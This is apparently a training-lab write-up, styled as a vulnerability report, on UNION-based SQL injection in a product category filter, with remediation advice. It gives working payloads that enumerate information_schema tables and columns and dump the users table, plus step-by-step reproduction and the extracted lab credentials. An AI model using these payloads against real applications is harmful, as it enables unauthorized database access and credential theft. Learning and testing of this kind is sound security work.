# Title

SQL Injection (UNION-based) — Listing Database Contents on Non-Oracle Databases

# Severity

High (7.5) — Full Credential Disclosure / Authentication Bypass

This finding exposes the complete `users` table (usernames and passwords, including the administrator's), leading directly to full account takeover.

# Summary

The product category filter is vulnerable to UNION-based SQL injection. Since the database schema (table/column names) is unknown up front, `information_schema.tables` and `information_schema.columns` were queried through the same injection point to enumerate the credentials table and its columns, and finally to dump all usernames and passwords directly in the application's response.

# Affected Endpoint

```
GET /filter?category=<input>
```

# Root Cause

```sql
SELECT * FROM products WHERE category = '<user_input>'
```

# Payload(s)

```
'+UNION+SELECT+'abc','def'--
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_fxhwds'--
'+UNION+SELECT+username_bamjaj,password_hwuodd+FROM+users_fxhwds--
```

# Payload Breakdown

- `'+UNION+SELECT+'abc','def'--`: confirms the query returns two columns, both compatible with text data.
- `information_schema.tables`: a standard metadata table (works on non-Oracle databases such as PostgreSQL/MySQL/MSSQL) that lists every table name in the database — used to find the credentials table without knowing its name in advance.
- `table_name='users_fxhwds'`: the randomized table name discovered from the previous step; querying `information_schema.columns` with this filter reveals every column that table has.
- `username_bamjaj`, `password_hwuodd`: the randomized column names discovered from the previous step, now selected directly from the target table to dump the actual credential data.
- `--`: comments out the rest of the original query so the injected SQL remains syntactically valid.

# Steps to Reproduce

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns returned by the query and confirm both are text-compatible:
   `'+UNION+SELECT+'abc','def'--`
3. Retrieve the list of tables in the database:
   `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
4. Identify the table holding user credentials — in this case `users_fxhwds`.
5. Retrieve the column names of that table:
   `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_fxhwds'--`
6. Identify the columns holding usernames and passwords — `username_bamjaj` and `password_hwuodd`.
7. Dump the usernames and passwords for all users:
   `'+UNION+SELECT+username_bamjaj,password_hwuodd+FROM+users_fxhwds--`
8. Use the administrator's extracted password to log in and solve the lab.

# Evidence
<img width="1920" height="1200" alt="Pasted image 20260915064650" src="https://github.com/user-attachments/assets/7b05fd61-97df-495a-9965-b97770839bac" />

<img width="1920" height="1200" alt="Pasted image 20260915064709" src="https://github.com/user-attachments/assets/a521aa6b-fff8-46d7-bbd9-eedc44b7d3ad" />

<img width="1920" height="1200" alt="Pasted image 20260915064855" src="https://github.com/user-attachments/assets/646dd83b-087c-4de2-b2c3-01757cfd7ac0" />

Extracted credentials:
- `wiener` : `7dnt7gxys3le4h8k8988`
- `carlos` : `0n46ga0bnadrxnoxl7qm`
- `administrator` : `psyegh42tq2vmhhtmpao`

# Impact

An attacker can enumerate the entire database schema and exfiltrate all stored credentials without any prior knowledge of table or column names, using only the metadata tables that non-Oracle databases expose by default. This leads to full account takeover, including the administrator account.

# Remediation

- Use parameterized queries (prepared statements). Do not add user input directly into SQL queries.
- Apply the principle of least privilege to the database account used by the application — it should not have read access to `information_schema` or other users' credential tables beyond what is strictly required.
- Store passwords only as salted hashes, never in retrievable plaintext.
- Disable verbose database responses that return raw query results directly to the client.
